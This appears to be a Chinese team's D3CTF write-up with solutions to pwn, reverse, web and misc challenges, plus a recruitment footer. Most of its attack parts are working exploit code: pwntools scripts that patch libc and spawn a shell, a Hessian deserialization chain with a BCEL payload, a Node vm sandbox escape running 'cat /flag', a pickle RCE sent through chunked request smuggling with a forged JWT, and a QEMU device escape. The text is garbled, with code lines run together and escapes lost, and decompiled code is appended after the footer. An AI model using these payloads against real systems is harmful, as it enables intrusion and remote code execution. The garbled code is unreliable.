000000000011B2E9 48 83 C4 28                       add     rsp, 28h.text:
000000000011B2ED C3                                retn

观察可得loc_11B2A0分支由于使用了栈来读写变量，因此可操作性更高。

修改000000000011B286来爆破000000000011B284 的判断，使其跳转至 loc_11B2A0 分支。

修改000000000011B2C6来爆破000000000011B2C4 的fd赋值，使其fd的值为0，因此该段逻辑被修改为 write(0,&flag[offset],1);，由于服务器使用的是 socket 通信，句柄0/1/2可以等价，所以结果是该flag字符被回传到客户端。

利用脚本

#!/usr/bin/env python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('47.103.122.127', 30815)
libc_addr = int(sh.recvuntil(b'-', drop=True), 16) - 0x26000success('libc_addr: ' + hex(libc_addr))
sh.sendline(f'{libc_addr + 0x11B286} {7}'.encode())sh.sendline(f'{libc_addr + 0x11B2C7} {7}'.encode())
for i in range(41):    sh.sendline(f'{libc_addr + 0x26000} {6+i}'.encode())
print(sh.recvrepeat(1).decode())
sh.interactive()

d3note

from pwn import *# io = process("./pwn")io = remote("139.224.62.61", 32739)elf = ELF("./pwn")libc = elf.libc
def menu(n):    io.sendline(str(n).encode())
def add(idx, size, con = b"/bin/sh"):    menu(0x114)    io.sendline(str(idx).encode())    io.sendline(str(size).encode())    io.sendline(con)
def show(idx):    menu(0x514)    io.sendline(str(idx).encode())

def edit(idx, con):    menu(0x810)    io.sendline(str(idx).encode())    io.sendline(con)
def delete(idx):    menu(0x1919)    io.sendline(str(idx).encode())
add(0, 0x10)
show(-0x39f)libcbase = u64(io.recv(6).ljust(8, b"x00")) - libc.sym['setbuf']print(f"libcbase: ", hex(libcbase))system = libcbase + libc.sym['system']
stdout = libcbase + 0x1d4780edit(-0x5b7, p64(stdout) + p64(elf.got['free']))edit(-4, p64(system))delete(0)io.interactive()#d3ctf{dd6becd3b8e0a75696cdefa1796fc1ae85c066d9}

RE

RandomVM

int main(){  unsigned char input[] =  {    0x9D, 0x6B, 0xA1, 0x02, 0xD7, 0xED, 0x40, 0xF6, 0x0E, 0xAE,    0x84, 0x19  };  unsigned char input22[] = "x4ex24xc0x64x17x60xc4x67x5ex29x5ex9b";  for (int i = 11; i > 0; i--)  {    input[i] ^= input[i - 1];  }  input[11] ^= 7;  input[11] = (input[11] << 7) | (input[11]  >> 1);
  input[10] ^= input[11];  input[10] = (input[10] << 4) | (input[10] >> 4);
  input[9] ^= input[10];  input[9] = (input[9] << 4) | (input[9] >> 4);
  input[8] ^= input[9];  input[8] = (input[8] << 2) | (input[8] >> 6);
  input[7] ^= input[8];  input[7] = (input[7] << 7) | (input[7] >> 1);
  input[6] ^= input[7];  input[6] ^= 7;  input[6] = (input[6] << 7) | (input[6] >> 1);
  input[5] ^= input[6];  input[5] = (input[5] << 4) | (input[5] >> 4);
  input[4] ^= input[5];  input[4] ^= 4;  input[4] = (input[4] << 4) | (input[4] >> 4);
  input[3] ^= input[4];  input[3] ^= 0x7;  input[3] = (input[3] << 7) | (input[3] >> 1);
  input[2] ^= input[3];  input[2] = (input[2] << 6) | (input[2] >> 2);
  input[1] ^= input[2];  input[1] = (input[1] << 5) | (input[1] >> 3);
  input[0] ^= input[1];  input[0] ^= 3;  input[0] = (input[0] << 3) | (input[0] >> 5);}

forest

from pwn import *
sc=open("shellcode.txt","rb").read()flag_bin=""sc_len=len(sc)
i=0flag1=1flag2=1flag3=1flag4=1flag5=1while len(flag_bin)<(17*8):    print(sc[i+0xe:i+0xe+4])    idx1=u32(sc[i+0xe:i+0xe+4])    idx2=u32(sc[i+0x19:i+0x19+4])    idx3=u32(sc[i+0x25:i+0x25+4])    idx4=u32(sc[i+0x30:i+0x30+4])    print(f"{hex(idx1)} {hex(idx2)} {hex(idx3)} {hex(idx4)}")    target1=(idx1+17*(idx2))*64    target12=sc[target1:
target1+1]    target2=(idx3+17*(idx4))*64    target22=sc[target2:
target2+1]
    if flag1:        if (1,0xd) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag1=0            print("path 2")            continue
    if flag2:        if (0xf,0xd) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag2=0            print("path 2")            continue
    if flag3:        if (0x5,2) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag3=0            print("path 2")            continue    if flag4:        if (8,0xb) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag4=0            print("path 2")            continue    if flag5:        if (2,16) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag5=0            print("path 2")            continue    if (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4]))==(u32(sc[target1+0xe:
target1+0xe+4]),u32(sc[target1+0x19:
target1+0x19+4])):        i=target2        flag_bin+="1"        print("path 2")        continue

    if b"xb8" in target12:        flag_bin+="0"        i=target1        print("path 1")    elif b"xcd" in target22:        flag_bin+="0"        i=target1        print("path 1")    else:        i=target2        flag_bin+="1"        print("path 2")    print(flag_bin)  
print(flag_bin)

ezjunk

from ctypes import * from libnum import *def encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0xE8017300)    delta=0xFF58F981    for i in range(32):        v0.value+=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])^0x44        v1.value+=(((v0.value<<5)^(v0.value>>6))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])^0x33        sum1.value-=delta    return v0.value,v1.value
def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=0xFF58F981    sum1=c_uint32(0xE8017300-delta*32)    for i in range(32):        sum1.value+=delta        v1.value-=(((v0.value<<5)^(v0.value>>6))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])^0x33        v0.value-=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])^0x44    return v0.value,v1.value

a=[get_wide_dword(0x404360+i*4) for i in range(8)]k=[0x5454,0x4602,0x4477,0x5e5e]flag=b''for i in range(4):    res=decrypt(a[i*2:i*2+2],k)    flag+=n2s(res[0])[::-1]    flag+=n2s(res[1])[::-1]print(flag.decode())

到这里，理论上认为程序已经退出了，但显然，加密步骤补全，所以考虑分析在main函数之前换了TEA的一些内容，但是没有什么新发现。

继续分析，发现在main函数开头，调用了0x401cc0

再继续跟进，发现0x401c50这个函数

他的基本函数的功能为：寻找一个数组的最后一个元素，然后从最后一个元素开始依次执行其指向的函数。

最后调用sub_401510函数，将sub_401C10函数作为参数传进去。

onexit()函数注册了一个函数，当程序退出时，执行它，那么很显然是这里的问题。

sub_401c10调用了(**off_404380)()

一直跟进去就是sub_4016BC这个函数，nop掉0x4016CA，0x4016E3，0x40176C，0x401785,

拿到第二部分加密

printf("hellv1[0] = 0xB6DDB3A9;v1[1] = 0x36162C23;v1[2] = 0x1889FABF;v1[3] = 0x6CE4E73B;v1[4] = 0xA5AF8FC;v1[5] = 0x21FF8415;v1[6] = 0x44859557;v1[7] = 0x2DC227B7; o world!");

void fdec(char *flag){    uint32_t dq_key = 0x84A6972F;
    uint32_t p;    int j, i;    for (i = 0; i < 8; i++)    {        p = *((uint32_t*)&flag[i * 4]);        for (j = 0; j < 32; j++)        {            if (p & 1)            {                p = ((uint32_t)p ^ dq_key) >> 1;                p |= 0x80000000;
            }            else            {                p = (uint32_t)p >> 1;            }        }        *((uint32_t*)&flag[i * 4]) = p;    }    for (i = 0; i < 48; i++)        printf("0x%x,", flag[i] & 0xff);    printf("n");    return;}

3710139819,2307229656,3137309,197438626,1298702698,1634491689,1536236277,1282871516,

a=[3710139819,2307229656,3137309,197438626,1298702698,1634491689,1536236277,1282871516,]k=[0x5454,0x4602,0x4477,0x5e5e]flag=b''for i in range(4):    res=decrypt(a[i*2:i*2+2],k)    flag+=n2s(res[0])[::-1]    flag+=n2s(res[1])[::-1]print(flag.decode())

d3ctf{ea3yjunk_c0d3_4nd_ea5y_re}

WEB

moonbox

import com.caucho.hessian.io.Hessian2Input;  import com.caucho.hessian.io.Hessian2Output;  import com.caucho.hessian.io.HessianInput;  import com.caucho.hessian.io.HessianOutput;  import com.sun.org.apache.bcel.internal.Repository;  import com.sun.org.apache.bcel.internal.classfile.JavaClass;  import com.sun.org.apache.bcel.internal.classfile.Utility;  import sun.reflect.ReflectionFactory;  import sun.security.pkcs.PKCS9Attribute;  import sun.security.pkcs.PKCS9Attributes;  import sun.swing.SwingLazyValue;    import javax.swing.*;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.lang.reflect.Constructor;  import java.lang.reflect.Field;  import java.lang.reflect.InvocationTargetException;  import java.util.Base64;    public class Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper {      public static void main(String[] args) throws Exception {          PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);          UIDefaults uiDefaults = new UIDefaults();          JavaClass evil = Repository.lookupClass(Calc.class);          String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);            uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));            setFieldValue(s,"attributes",uiDefaults);            ByteArrayOutputStream baos = new ByteArrayOutputStream();          Hessian2Output out = new Hessian2Output(baos);          baos.write(67);          out.getSerializerFactory().setAllowNonSerializable(true);          out.writeObject(s);          out.flushBuffer();          System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));          ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());          Hessian2Input input = new Hessian2Input(bais);          input.readObject();      }        public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {          return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);      }        public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {          Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);          objCons.setAccessible(true);          Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);          sc.setAccessible(true);          return (T) sc.newInstance(consArgs);      }      public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {          Field field = obj.getClass().getDeclaredField(fieldName);          field.setAccessible(true);          field.set(obj, value);      }  }

POST /api/agent/record/save HTTP/1.1Host: 106.54.28.21:
9999Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Origin: http://192.168.0.105:
8000Accept: application/json, text/plain, */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0Content-Type: application/jsonReferer: http://192.168.0.105:
8000/Content-Length: 80
Q0MwIXN1bi5zZWN1cml0eS5wa2NzLlBLQ1M5QXR0cmlidXRlc5QbaWdub3JlVW5zdXBwb3J0ZWRB
dHRyaWJ1dGVzCmF0dHJpYnV0ZXMTcGVybWl0dGVkQXR0cmlidXRlcwtkZXJFbmNvZGluZ2BGTRZq
YXZheC5zd2luZy5VSURlZmF1bHRzQzAic3VuLnNlY3VyaXR5LnV0aWwuT2JqZWN0SWRlbnRpZmll
cpMMY29tcG9uZW50TGVuCGVuY29kaW5nCmNvbXBvbmVudHNhjykqhkiG9w0BCQFOQxhzdW4uc3dp
bmcuU3dpbmdMYXp5VmFsdWWTCWNsYXNzTmFtZQptZXRob2ROYW1lBGFyZ3NiMDFjb20uc3VuLm9y
Zy5hcGFjaGUuYmNlbC5pbnRlcm5hbC51dGlsLkphdmFXcmFwcGVyBV9tYWlucQdbb2JqZWN0cQdb
c3RyaW5nUwQTJCRCQ0VMJCQkbCQ4YiRJJEEkQSRBJEEkQSRBJEFtUSRkYk4kZGIkNDAkUSQzZCQ5
YjhxJGUyJGckQyRhNiQ0MEskODAkOWEkNWVSJGE3JHdxUiRhNVUkYWIkYTAkYmMkbSQ5MCQ5MCR5
JGE4JGVhJDhhJHckZWFDJGI1MSRhYiRiMCR1JGIxJDkxJGVkRCRmY1ZfWiQ4NEQkM2YkODAkOGZC
JDlkJE4kODhwJDViaSRlN3gkY2UkY2MkOWMkWiRjZiQ1ZSQ1YyQ5ZSRmZCREJGQwRCRkNSQ0MCRS
JGNmJE4keSRhMSRhY2MkYjkkODAkOTUkQ1YkTHgkYTEkSSQ1YiRjNyQ5YSQ4ZSQ5NyRNJGY5JE4k
WiRjYSRiNCRjZCQ5MHUkYWEkZmIkTSRkYWZ0JG0kWUokOWUkTSRjNSRlZXAkZDAkViRmMXckZGUk
ZWQkVGN5USRjMCRmYiRmYiQzYyQ5NiRjYSRiZiRzJGI1JGY0UCRzJGE0JGUxbSRmMiQ3ZSRkMGIk
YzgkZmQkZ3AkWjIkeTgkM2YkYmQkcCQzZSRlMm4kOWYkODckM2QkZDdPYyRaJGY2WmN5JGskZjdG
JE1zJDhmJDg0JFokOGMkYWQkOTMkNDAkaSRhNzIkSyRUJGokYWYkYzgkZjckYTNhJGkkODhtJGE5
WiRWVSQ4YiQ5YSRhYTJhJGUwJDg5JDhlJGQ3JHMkZGUkYTAkYzIwc18kODkkYmF0eXIkYzgkOTBZ
JFAkWSRkZSRhYm8kN2IkNWQkZGEkZWQkOGEkZWQkayQ4OCQ5MSQ5YiRHJGM3biRhMyRmZSRhOSRm
NiRiMVkkZmJQJGZmUms0JDNlJGJiTSQzYXYkYmQkNWRpJDk4eCRMRyR6JDgxeiRkZFEkZGUkZWIk
ayQ4OSRtJGE1JGMxJHQkZDQkY2QkYjAkTSRiMyRUJGY2JGRiMEwkZTUkODAkZTY1eiRvJGJkcSRl
NiQ5ZCRhYSRmNyRtJDg3JGZlWCRUJHQkODIkZzkkOGYkYWUkZWIkVyRmNTUkOGUkQyQ5MSRxJHok
YWMkYTEkNDBPJGFhTiRHTCRlZCQ4MSRhY0kkOWVLJGM4JElzJGVmJGZlJDgyJGZkJGskODckYTck
YzgkZTYkYzdkJFckZDNkJGNkJGFiJEUkOTQwQ1gkYzQkeSR5JGNhUiRjNSQzYiRjNCRhYVgkZjkk
VSQ5OSRmYzkkYjIkOWQkYWMkYTUkZjkkaiRjZCRjYSRmOSQ5ZCQ5YyQ5NSRmNyRmZiQ0MCRmZjEk
OTE0JEkkOTUkZjAkUyRmNCQ1YiRiMmUkY2MkZTEkdiRlMSQzYyQ1ZCQ4ZCQ5OCRGJGJhJDhiJGUz
JDlhZyRmZiRCJGVhdjEkOWYkOGUkQyRBJEFaTk4=

stack_overflow

看了好久 一开始以为是pwn题 后面发现和pwn一点关系没有

定位到vm.runInNewContext 然后去搜这个函数 发现这个函数是vm沙箱逃逸的

https://cloud.tencent.com/developer/article/2273819

');this.constructor.constructor('return process.mainModule.require(\'child_process\').execSync(\'cat /flag\').toString();')();//

d3pythonhttp

下载附件 发现题目开了两个容器 一个是8081 一个是8080 我们访问的是8081端口

我们真正的目标是8080端口的pickled反序列化处

接着就是绕过BackdoorPasswordOnlyForAdmin 看到if headers.get(“Transfer-Encoding”, “”).lower() == “chunked”: 直接想到走私

https://xz.aliyun.com/t/11728

请求是以Transfer-Encoding发送的，后端是正常post请求 检查Contnt-Length

然后就是pickle反序列化的 但题目不出网 这里我们想到还有个函数没用用到

class A():    def __reduce__(self):        return (eval,("open('/tmp/flag.py','w').write("class aaa:\n def GET(self):\n  return __import__('os').popen('cat /Secr3T_Flag').read()"),__import__('sys').path.append('/tmp'),globals().update({'index':
__import__('flag').__dict__['aaa']})",))a = A()b = pickle.dumps(a)

import os
from requests import Request, Sessionimport pickleimport base64
class A():    def __reduce__(self):        return (eval,("open('/tmp/flag.py','w').write("class aaa:\n def GET(self):\n  return __import__('os').popen('cat /Secr3T_Flag').read()"),__import__('sys').path.append('/tmp'),globals().update({'index':
__import__('flag').__dict__['aaa']})",))a = A()b = pickle.dumps(a)data=base64.b64encode(b)+b'BackdoorPasswordOnlyForAdmin'data = "{}rn{}rn0rnrn".format(hex(len(data))[2:], data.decode())print(data)c={'token':'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL3Byb2MvMS9jbWRsaW5lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.47YQeGE7ASKvQS8kSrCQlGtGy9aoJmzFKu8cqUaL5kI'}#c={'token':'eyJhbGciOiJIUzI1NiIsImtpZCI6IjEudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImEiLCJpc2FkbWluIjp0cnVlfQ.5JUJkbO4TQOoCJliTJhKHN4X3zPs7J_ehoPoAtXZnmM'}headers = {    'Transfer-Encoding': 'CHuNkeD',}s = Session()req = Request('POST', url='http://ip:
port/admin',data=data,cookies=c,headers=headers)prepped = req.prepare()prepped.headers['content-length']= str(len(base64.b64encode(b)))response = s.send(prepped)print(response.text)

MISC

Baldur’s Gate 3 Complete Spell List

先手动处理一下附件给的内容

参考wiki，一个一个对着搜即可，按照顺序分组，用等级转换

https://bg3.wiki/wiki/List_of_all_spells

之后转换为之后觉得是9进制

def base9_to_decimal(nine_num):    decimal_num = 0    power = 0    for digit in reversed(nine_num):        decimal_num += int(digit) * (9 ** power)        power += 1    return decimal_num
def decrypt_base9(ciphertext):    plaintext = ""    for num in ciphertext:        decimal_num = base9_to_decimal(num)        plaintext += chr(decimal_num)    return plaintext
tmp = ['236','249','249','245','248','75','63','63','239','244','228','241','228','248','249','244','249','236','233','242','228','254','62','231','244','242','63','81','228','91','212','64','231','91','96','71','95','255','74','245','95','243','84','252','231','67','212','245','229','217','231','251','219','66','96','252','98','216','236','68','96','91','236','242','231','66','248','252','221','242','254','236','221','255','69','253','229','242','231','78']
for x in tmp:    flag = ''    for y in x:        flag +=chr(ord(y)-1)    print(flag,end=' ')ciphertext = '125 138 138 134 137 64 52 52 128 133 117 130 117 137 138 133 138 125 122 131 117 143 51 120 133 131 52 70 117 80 101 53 120 80 85 60 84 144 63 134 84 132 73 141 120 56 101 134 118 106 120 140 108 55 85 141 87 105 125 57 85 80 125 131 120 55 137 141 110 131 143 125 110 144 58 142 118 131 120 67'ciphertext = ciphertext.split()print('n')plaintext = decrypt_base9(ciphertext)print("解密后的文本:", plaintext)

https://koalastothemax.com/?aHR0cHM6Ly9pLnBvc3RpbWcuY2MvOVh4MHhmc2svZmxhZy5wbmc=

https://i.postimg.cc/9Xx0xfsk/flag.png

d3ctf{y0u_are_spells_m4ster}

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@LYK0r4师傅


```
00000000 device          struc ; (sizeof=0xD50, mappedto_113)00000000 field_0         db 2560 dup(?)00000A00 offset          dd ?00000A04 field_A04       db 560 dup(?)00000C34 content         db 256 dup(?)00000D34                 db ? ; undefined00000D35                 db ? ; undefined00000D36                 db ? ; undefined00000D37                 db ? ; undefined00000D38 srand           dq ?00000D40 rand            dq ?00000D48 rand_r          dq ?                    ; offset00000D50 device          ends
void *__fastcall l0dev_instance_init(__int64 a1){  device *dev; // rax
  dev = (device *)sub_7F810F(a1, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 229LL, "l0dev_instance_init");  dev->srand = (__int64)&srand;  dev->rand = (__int64)&rand;  dev->rand_r = (int (__fastcall *)(_QWORD *))&rand_r;  return memset(dev->content, 0, sizeof(dev->content));}
__int64 __fastcall l0dev_mmio_read(__int64 opaque, unsigned __int64 addr, unsigned int size){  __int64 dest; // [rsp+30h] [rbp-20h] BYREF  device *dev; // [rsp+38h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+40h] [rbp-10h]  unsigned __int64 v8; // [rsp+48h] [rbp-8h]
  v8 = __readfsqword(0x28u);  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 82LL, "l0dev_mmio_read");  dest = -1LL;  rounds_down = addr >> 3;  if ( size > 8 )    return dest;  if ( 8 * rounds_down + size <= 0x100 )    memcpy(&dest, &dev->content[(unsigned int)(dev->offset + addr)], size);  return dest;}
__int64 __fastcall l0dev_pmio_read(__int64 opaque, unsigned __int64 addr, unsigned int size){  __int64 dest; // [rsp+30h] [rbp-20h] BYREF  device *dev; // [rsp+38h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+40h] [rbp-10h]  unsigned __int64 v8; // [rsp+48h] [rbp-8h]
  v8 = __readfsqword(0x28u);  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 104LL, "l0dev_pmio_read");  dest = -1LL;  rounds_down = addr >> 3;  if ( size > 8 )    return dest;  if ( 8 * rounds_down + size > 0x100 )    return dest;  memcpy(&dest, &dev->content[(unsigned int)addr], size);  if ( (_DWORD)dest == 666 )    ++write_enable;  return dest;}
device *__fastcall l0dev_mmio_write(__int64 opaque, unsigned __int64 addr, device *val, unsigned int size){  device *result; // rax  device *val_1; // [rsp+8h] [rbp-38h] BYREF  unsigned __int64 v7; // [rsp+10h] [rbp-30h]  __int64 v8; // [rsp+18h] [rbp-28h]  int addr_1; // [rsp+24h] [rbp-1Ch]  device *dev; // [rsp+28h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+30h] [rbp-10h]  device *v12; // [rsp+38h] [rbp-8h]
  v8 = opaque;  v7 = addr;  val_1 = val;  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 133LL, "l0dev_mmio_write");  rounds_down = addr >> 3;  result = (device *)addr;  addr_1 = addr;  if ( size <= 8 )  {    result = (device *)(8 * rounds_down + size);    if ( (unsigned __int64)result <= 0x100 )    {      if ( addr_1 == 64 )      {        v12 = val_1;        addr_1 = dev->rand_r(&val_1) % 256;        return (device *)memcpy(&dev->content[addr_1], &val_1, size);      }      else if ( addr_1 == 128 )      {        result = val_1;        if ( (unsigned __int64)val_1 <= 0x100 )        {          result = dev;          dev->offset = (unsigned int)val_1;        }      }      else      {        return (device *)memcpy(&dev->content[addr_1], &val_1, size);      }    }  }  return result;}
void *__fastcall l0dev_pmio_write(__int64 opaque, unsigned __int64 addr, __int64 val, unsigned int size){  void *result; // rax  __int64 val_1; // [rsp+8h] [rbp-38h] BYREF  unsigned __int64 addr_1; // [rsp+10h] [rbp-30h]  __int64 v8; // [rsp+18h] [rbp-28h]  int v9; // [rsp+2Ch] [rbp-14h]  device *dev; // [rsp+30h] [rbp-10h]  unsigned __int64 v11; // [rsp+38h] [rbp-8h]
  v8 = opaque;  addr_1 = addr;  val_1 = val;  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 173LL, "l0dev_pmio_write");  if ( write_enable )    return memcpy(&dev->content[(unsigned int)(dev->offset + addr_1)], &val_1, size);  result = (void *)(addr_1 >> 3);  v11 = addr_1 >> 3;  if ( size <= 8 )  {    result = (void *)(8 * v11 + size);    if ( (unsigned __int64)result <= 0x100 )    {      v9 = addr_1;      return memcpy(&dev->content[(unsigned int)addr_1], &val_1, size);    }  }  return result;}
    #define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <stdint.h>#include <string.h>#include <fcntl.h>#include #include <sys/mman.h>#include <sys/io.h>
char *mmio_mem;
inline static unsigned int mmio_read(unsigned int addr){    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);    return *(mmio);}
inline static void mmio_write(long addr, unsigned int val){    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);    *(mmio) = val;}
    #define IO_PORT 0xc000inline static size_t pmio_read(size_t addr){    size_t pmio = IO_PORT + addr;    return inl(pmio);}inline static void pmio_write(size_t addr, unsigned int val){    size_t pmio = IO_PORT + addr;    outl(val, pmio);}
int main(){    int mmio_fd;    size_t libc_addr = 0, system_addr;        // Open and map I/O memory for the string device    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);    if (mmio_fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    if(iopl(3) == -1) /* Apply to system for accessing the port */    {        perror("iopl");        exit(EXIT_FAILURE);    }
    mmio_write(128, 0x100);    libc_addr = mmio_read(4);    libc_addr = libc_addr + (mmio_read(8) * 0x100000000); // srandom sym    libc_addr = libc_addr - 0x460a0; // srandom offset    printf("libc_addr: %#lxn", libc_addr);    system_addr = libc_addr + 0x50d70;
    pmio_write(0, 666);    pmio_read(0);
    pmio_write(20, system_addr);    pmio_write(24, system_addr/0x100000000);
    mmio_write(64, 0x6873);        return 0;}
unsigned __int64 __fastcall zif_addHacker(__int64 a1, zval *return_value){  __int64 v3; // rdi  __int64 index; // rdx MAPDST  char *p_type; // rax  chunk *v7; // r12  node *node; // rbx  char *buf; // rax  size_t arg1_len; // rdx  char *arg1_buf; // rsi  size_t end_char; // rax  zval *arg2; // [rsp+8h] [rbp-40h] MAPDST BYREF  zval *arg1; // [rsp+10h] [rbp-38h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-30h]
  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = ' ';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}
00000000 chunk           struc ; (sizeof=0x10, mappedto_24)00000000                                         ; XREF: .bss:
chunkList/r00000000 node            dq ?                    ; offset00000008 type            dd ?0000000C field_C         dd ?00000010 chunk           ends0000001000000000 ; ---------------------------------------------------------------------------0000000000000000 node            struc ; (sizeof=0x11, mappedto_25)00000000 buf             dq ?                    ; offset00000008 size            dq ?00000010 arg2_string     db ?00000011 node            ends
static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC){#if ZEND_MM_STAT  do {    size_t size = heap->size + bin_data_size[bin_num];    size_t peak = MAX(heap->peak, size);    heap->size = size;    heap->peak = peak;  } while (0);#endif
    // 优先从 free_slot 取内存  if (EXPECTED(heap->free_slot[bin_num] != NULL)) {    zend_mm_free_slot *p = heap->free_slot[bin_num];    heap->free_slot[bin_num] = p->next_free_slot;    return p;  } else {    return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);  }}
static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC){  zend_mm_chunk *chunk;  int page_num;  zend_mm_bin *bin;  zend_mm_free_slot *p, *end;
    #if ZEND_DEBUG  bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);#else  bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);#endif  if (UNEXPECTED(bin == NULL)) {    /* insufficient memory */    return NULL;  }
  chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);  page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;  chunk->map[page_num] = ZEND_MM_SRUN(bin_num);  if (bin_pages[bin_num] > 1) {    uint32_t i = 1;
    do {      chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);      i++;    } while (i < bin_pages[bin_num]);  }
